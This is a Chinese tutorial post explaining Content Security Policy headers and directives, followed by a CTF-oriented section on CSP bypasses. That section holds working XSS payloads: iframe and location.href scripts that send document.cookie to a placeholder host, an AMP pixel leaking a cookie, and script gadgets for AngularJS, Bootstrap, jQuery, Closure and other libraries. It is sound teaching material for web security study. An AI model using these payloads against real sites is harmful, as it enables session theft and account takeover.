<div class="title-image"><img src="https://pic4.zhimg.com/v2-e5e1b10290e97ebb1855d6afe10f5721_b.jpg" alt=""></div><h2>CSP🎫</h2><p><b>0️⃣CSP的由来？</b></p><p>一个简单的 XSS 漏洞页面，没有对用户的输入进行过滤，就像这样：</p><div class="highlight"><pre><code class="language-text">&lt;form&gt;
    &lt;input type=&#34;text&#34; name=&#34;name&#34; value=&#34;&lt;?php echo $_GET[&#34;name&#34;]; ?&gt;&#34; /&gt;
    &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
&lt;/form&gt;</code></pre></div><p>对于这样毫无过滤的页面，我们可以轻而易举的进行 XSS。</p><div class="highlight"><pre><code class="language-text">&#34;/&gt; &lt;script&gt;alert(0)&lt;/script&gt; &lt;!--</code></pre></div><p>对于这样的漏洞点来说，我们通常会使用 htmlspecialchars 函数来过滤输入。</p><blockquote>htmlspecialchars 函数：将特殊字符转换为 HTML 实体。</blockquote><div class="highlight"><pre><code class="language-text">&amp; (AND) =&gt; &amp;amp;
&#34; (双引号) =&gt; &amp;quot;
&#39; (单引号) =&gt; &amp;#039;
&lt; (小于号) =&gt; &amp;lt; 
&gt; (大于号) =&gt; &amp;gt;</code></pre></div><p>类似的输入点还有很多很多。</p><div class="highlight"><pre><code class="language-html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;xxx&#34;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">xxx</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;xxx&#34;</span><span class="p">&gt;</span></code></pre></div><p>刚才的 htmlspecialchars 就没有作用了，为了抵御 XSS，我们必须想想其他的方法。</p><p>首先是一些特殊符号，比如：</p><div class="highlight"><pre><code class="language-text">% * , + – / &lt; = &gt; ^ | ` ; &#34; &#39;</code></pre></div><p>如果将这些符号全部加入黑名单，那正常用户的输入必定会受到限制。</p><p>所以程序猿开始使用 htmlspecialchars 函数 + 黑名单 的过滤方法。</p><div class="highlight"><pre><code class="language-text">on\w+=
script
iframe
link
svg</code></pre></div><p>这样做虽然已经很完美了，但是不能防御今后会发生的情况。那么问题来了，可不可以从浏览器的层面来防御 XSS 漏洞呢？</p><p>与是 CSP 就这样诞生了🎉</p><p><b>1️⃣什么是CSP？</b></p><p>CSP 的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p><blockquote>CSP 指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</blockquote><p>简而言之就是个门禁，刷卡才能进。</p><p><b>2️⃣CSP的作用？</b></p><p>防 XSS 等攻击的利器。</p><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p><p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p><p><b>3️⃣CSP的分类？</b></p><ol><li><b>Content-Security-Policy：</b>配置好并启用后，不符合 CSP 的外部资源就会被阻止加载。</li><li><b>Content-Security-Policy-Report-Only：</b>表示不执行限制选项，只是记录违反限制的行为。它必须与report-uri选项配合使用。</li></ol><h2>CSP结构🧪</h2><p>CSP中常见的header字段为Content-Security-Policy。  一个CSP头由多组CSP策略组成，中间由分号分隔，如下：</p><div class="highlight"><pre><code class="language-text">Content-Security-Policy: default-src &#39;self&#39; www.twosecurity.com; script-src &#39;unsafe-inline&#39;</code></pre></div><p>其中每一组策略包含一个策略指令和一个内容源列表。</p><p><b>策略指令</b>👇</p><p><b>default-src</b></p><p>default-src 作为所有其他指令的备用，一般来说 default-src &#39;none&#39;; script-src &#39;self&#39; 这样的情况就会是 script-src 遵循 self，其他的都会使用 none。也就是说，除了被设置的指令以外，其余指令都会被设置为 default-src 指令所设置的属性。</p><p>该指令包含了以下指令：</p><ul><li>child-src</li><li>connect-src</li><li>font-src</li><li>img-src</li><li>media-src</li><li>object-src</li><li>script-src</li><li>style-src </li></ul><p><b>script-src</b></p><p>script-src 指令限制了所有 js 脚本可以被执行的地方，包括通过链接方式加载的脚本 url 以及所有内联脚本，甚至包括各种方式的引用。其中还有一个很重要的参数叫 &#39;unsafe-inline&#39;，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。  </p><p>对于这个属性有个特殊的配置叫 unsafe-eval，它会允许下面几个函数：</p><div class="highlight"><pre><code class="language-text">eval() Function() setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.</code></pre></div><p><b>关键字👇</b></p><p><b>&#39;none&#39;</b></p><p>代表空集；即不匹配任何 URL。两侧单引号是必须的。</p><p><b>&#39;self&#39; </b></p><p>代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</p><p><b>&#39;unsafe-inline&#39; </b></p><p>允许使用内联资源，如内联的 script 元素、javascript: URL、内联的事件处理函数和内联的 style 元素，两侧单引号是必须的。</p><p><b>&#39;unsafe-eval&#39; </b></p><p>允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。 </p><p><b>数据</b>👇</p><p><b>data: </b></p><p>允许 data: URI 作为内容来源。这是不安全的，因为攻击者可以精心构造 data: URI 来攻击。请谨慎地使用这个源，并确保不要用于脚本。</p><p><b>mediastream: </b></p><p>允许 mediastream: URI 作为内容来源。</p><div class="highlight"><pre><code class="language-text">Content-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</code></pre></div><p><b>CSP的使用？</b></p><p>一：在HTTP Header上使用</p><div class="highlight"><pre><code class="language-text">&#34;Content-Security-Policy:&#34; #策略
&#34;Content-Security-Policy-Report-Only:&#34; #策略</code></pre></div><p>二：在HTML上使用</p><div class="highlight"><pre><code class="language-text">&lt;meta http-equiv=&#34;content-security-policy&#34; content=&#34;#策略&#34;&gt;
&lt;meta http-equiv=&#34;content-security-policy-report-only&#34; content=&#34;#策略&#34;&gt;</code></pre></div><p>Meta 标签与 HTTP 头只是行式不同而作用是一致的，如果 HTTP 头与 Meta 定义同时存在，则优先采用 HTTP 中的定义。</p><p>如果用户浏览器已经为当前文档执行了一个 CSP 的策略，则会跳过 Meta 的定义。如果 META 标签缺少 content 属性也同样会跳过。</p><h2>CTF中的CSP绕过💫</h2><p>这里简单介绍几种拿 cookie 的绕过思路，没有涉及到的希望大佬们评论区补充完善，小弟感激涕零😭。</p><p>CSP：</p><div class="highlight"><pre><code class="language-php"><span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">,</span><span class="nx">md5</span><span class="p">(</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">)));</span>
    <span class="p">}</span>
        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy: default-src &#39;self&#39;;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;Your GET content:&#34;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">];</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p><b>iframe绕过</b></p><p>如果有两个页面：</p><div class="highlight"><pre><code class="language-php"><span class="c">&lt;!--a.php--&gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">,</span><span class="nx">md5</span><span class="p">(</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">)));</span>
    <span class="p">}</span>
        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy: default-src &#39;self&#39;;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;Your GET content:&#34;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">];</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p class="ztext-empty-paragraph"><br/></p><div class="highlight"><pre><code class="language-php"><span class="c">&lt;!--b.php--&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;Your GET content:&#34;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">];</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>前面的 a.php 做了 CSP 保护策略，而 b.php 没有保护。</p><p>so，我们可以在 b 页面新建 iframe 用 javascript 直接操作 a 页面的 dom：</p><div class="highlight"><pre><code class="language-php"><span class="c">&lt;!-- xss 代码，要注意 url 编码 --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
<span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;./a.php&#34;</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
<span class="nx">setTimeout</span><span class="p">(()=&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;http://x.x.x.x/cookie/&#39;</span><span class="o">+</span><span class="nx">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">),</span><span class="mi">1000</span><span class="p">);</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></div><p><b>location绕过</b></p><p>有的情况 csp 会使用 script-src &#39;unsafe-inline&#39;; 这个地方可以直接用location.href(window.location/window.open) 绕过</p><div class="highlight"><pre><code class="language-text">127.0.0.1/csp/?twosecurity=&lt;script&gt;location.href=&#39;http://x.x.x.x/cookie/&#39;%2bescape(document.cookie);&lt;/script&gt;</code></pre></div><p><b>CDN绕过</b></p><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他 CDN 上的 JS 框架，如果 CDN 上存在一些低版本的框架，就可能存在绕过 CSP 的风险。</p><blockquote>CDN，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN 的关键技术主要有内容存储和分发技术。</blockquote><p>这里的 CSP 引用了 <a href="https://link.zhihu.com/?target=http%3A//cloudflare.com" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">http://</span><span class="visible">cloudflare.com</span><span class="invisible"></span></a> CDN 服务，于是可以采用了低版本的 angular js 模板注入来绕过 CSP，如下</p><div class="highlight"><pre><code class="language-text">&lt;!-- foo=&#34;--&gt;
&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;
&lt;/script&gt;
&lt;div ng-app&gt;
    {{constructor.constructor(&#39;alert(document.cookie)&#39;)()}}
&lt;/div&gt;
&#34; --&gt;</code></pre></div><p>其原理是，waf 对注释完全可信，所以构造一个 &lt;!-- foo=&#34;bar--&gt; &lt;script&gt;alert(1)&lt;/script&gt;&#34; --&gt;，只要闭合注释内容，就可以让后面的完全可控，再加上 <a href="https://link.zhihu.com/?target=https%3A//portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs" class=" wrap external" target="_blank" rel="nofollow noreferrer">Client-Side Template Injection</a> 中的手法，绕过 CSP。  </p><p>存在低版本 angular js 的 cdn 服务商列表：<a href="https://link.zhihu.com/?target=https%3A//github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/google/csp-e</span><span class="invisible">valuator/blob/master/whitelist_bypasses/angular.js</span><span class="ellipsis"></span></a></p><p>除了低版本 angular js 的模板注入，还有许多库可以绕过 CSP。</p><p>比如，如果用了 Jquery-mobile 库，且 CSP 中包含 &#34;script-src &#39;unsafe-eval&#39;&#34; 或者 &#34;script-src &#39;strict-dynamic&#39;&#34;，可以用这个 exp。</p><div class="highlight"><pre><code class="language-text">&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre></div><p>还比如 RCTF2018 题目出现的 AMP 库，可以使用下面的标签获取名字为 FLAG 的 cookie。</p><div class="highlight"><pre><code class="language-text">&lt;amp-pixel src=&#34;http://x.x.x.x/?cid=CLIENT_ID(FLAG)&#34;&gt;&lt;/amp-pixel&gt;  </code></pre></div><p>以及，这样的 HTML 代码：</p><div class="highlight"><pre><code class="language-text">&lt;div data-bind=&#34;value:&#39;hello world&#39;&#34;&gt;&lt;/div&gt;
</code></pre></div><p>可这样绕过它：</p><div class="highlight"><pre><code class="language-text">switch (node.nodeType) {
    case 1: return node.getAttribute(“data-bind”);
var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
    functionBody = &#34;with($context){with($data||{}){return{&#34; + rewrittenBindings + &#34;}}}&#34;;
return new Function(&#34;$context&#34;, &#34;$element&#34;, functionBody);
return bindingFunction(bindingContext, node);</code></pre></div><p>这些代码创建了一个 eval() 属性。</p><p>data-bind=&#34;value: foo&#34;  ==&gt;  eval(&#34;foo&#34;)</p><p>--------------------------------</p><p>为了构建 XSS，一个基于 knockout 的 JS 应用，攻击者需要注入：</p><div class="highlight"><pre><code class="language-text">&lt;div data-bind=&#34;value: alert(1)&#34;&gt;&lt;/div&gt;</code></pre></div><p>--------------------------------</p><p>Ajaxify 小工具使用 class=document-script 将其转换成脚本元素。如果你有一个 XSS 在一个网站上使用 Ajaxify，你只需注入：</p><p>Ajaxify：<a href="https://link.zhihu.com/?target=https%3A//github.com/browserstate/ajaxify" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/browserstate</span><span class="invisible">/ajaxify</span><span class="ellipsis"></span></a></p><div class="highlight"><pre><code class="language-text">&lt;div class=&#34;document-script&#34;&gt;alert(1)&lt;/div&gt;</code></pre></div><p>Ajaxify 将为你完成后面的工作。</p><p>--------------------------------</p><p>Bootstrap 拥有“最简单”的小工具，将 HTML 属性值传递给 innerHTML。</p><blockquote>Bootstrap 是基于 HTML、CSS、JavaScript 开发的简洁、直观、强悍的前端开发框架，使得 Web 开发更加快捷。</blockquote><div class="highlight"><pre><code class="language-text">&lt;div data-toggle=tooltip data-html=true title=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;</code></pre></div><p>HTML 防护允许 title 属性，因为它通常是安全的。但当与引导和其他数据属性一起使用时，就不一样了。</p><p>--------------------------------</p><p>Closure 类检测它自己的脚本 URL，然后从相同的位置加载子资源。通过注入其他 HTML 标签，很可能会把 Closure 与从其他地方加载混淆:</p><div class="highlight"><pre><code class="language-text">&lt;a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//&gt;&lt;/a&gt;
&lt;form id=CLOSURE_UNCOMPILED_DEFINES&gt;
&lt;input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING&gt;&lt;/form&gt;</code></pre></div><p>--------------------------------</p><p>Require JS 允许用户指定 JavaScript 文件的“main”模块，这是通过自定义数据属性完成的，而 XSS 过滤器和其他缓解机制并不知道这个数据属性。</p><div class="highlight"><pre><code class="language-text">&lt;script data-main=&#39;data:1,alert(1)&#39; src=&#39;require.js&#39;&gt;&lt;/script&gt;</code></pre></div><p>--------------------------------</p><p>这是一个 inert 脚本标签：</p><div class="highlight"><pre><code class="language-text">&lt;script src=//i.am.an.invalid.self.closing.script.tag csp=ignores-me /&gt;</code></pre></div><p>Ember*dev 版本只创建一个有效的副本并重新插入它。自从 strict-dynamic CSP 允许动态插入脚本，用这个 payload 绕过它：</p><div class="highlight"><pre><code class="language-text">&lt;script type=text/x-handlebars&gt;
 &lt;script src=//attacker.example.com// /&gt;
&lt;/script&gt;
</code></pre></div><p>--------------------------------</p><p>jQuery 有一个小工具，它接受现有的</p><div class="highlight"><pre><code class="language-text">&lt;form class=&#34;child&#34;&gt;
&lt;input name=&#34;ownerDocument&#34;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/form&gt;</code></pre></div><p>严格动态的 CSP 阻塞&lt;script&gt;，然后 jQuery 重新插入它。现在它被信任并将执行。</p><p>--------------------------------</p><ol><li>绕过 CSP strict-dynamic via Bootstrap</li></ol><div class="highlight"><pre><code class="language-text">&lt;div data-toggle=tooltip data-html=true title=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre></div><p>2. jQuery Mobile 绕过杀毒软件</p><div class="highlight"><pre><code class="language-text">&lt;div data-role=popup id=&#39;--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;
</code></pre></div><p>3. Closure 绕过 NoScript (DOM clobbering)</p><div class="highlight"><pre><code class="language-text">&lt;a id=CLOSURE_BASE_PATH href=http://attacker/xss&gt;&lt;/a&gt;
</code></pre></div><p>4. Dojo Toolkit 绕过 ModSecurity CRS</p><div class="highlight"><pre><code class="language-text">&lt;div data-dojo-type=&#34;dijit/Declaration&#34; data-dojo-props=&#34;}-alert(1)-{&#34;&gt;
</code></pre></div><p>5. underscore 模板绕过 CSP unsafe-eval</p><div class="highlight"><pre><code class="language-text">&lt;div type=underscore/template&gt; &lt;% alert(1) %&gt; &lt;/div&gt;</code></pre></div><p>利用条件:  </p><ul><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ul><p><b>meta网页跳转绕过</b></p><p>这个情况的话，可以利用 meta 标签实现网页跳转：</p><div class="highlight"><pre><code class="language-text">127.0.0.1/csp/?twosecurity=&lt;meta http-equiv=&#34;refresh&#34; content=&#34;1;url=http://x.x.x.x/&#34; &gt;</code></pre></div><p><b>站点可控静态资源绕过</b></p><p>给一个绕过 codimd 的 codimd xss </p><p>例子中 codimd 的 CSP 中使用了 google-analytics，而 analytics 中提供了自定义 javascript 的功能（google会封装自定义的js，所以还需要 unsafe-eval），于是可以绕过 CSP。</p><div class="highlight"><pre><code class="language-text">&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://www.google-analytics.com&#34;&gt;
&lt;script src=&#34;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&#34;&gt;&lt;/script&gt;</code></pre></div><p>有关 <b>CSP绕过 </b>的内容就简单介绍到这里。更多有关 CTF 的内容请前往 <a href="https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a> 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg" data-caption="" data-size="normal" data-rawwidth="720" data-rawheight="403" class="origin_image zh-lightbox-thumb" width="720" data-original="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg" data-caption="" data-size="normal" data-rawwidth="720" data-rawheight="403" class="origin_image zh-lightbox-thumb lazy" width="720" data-original="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg"/></figure><p></p>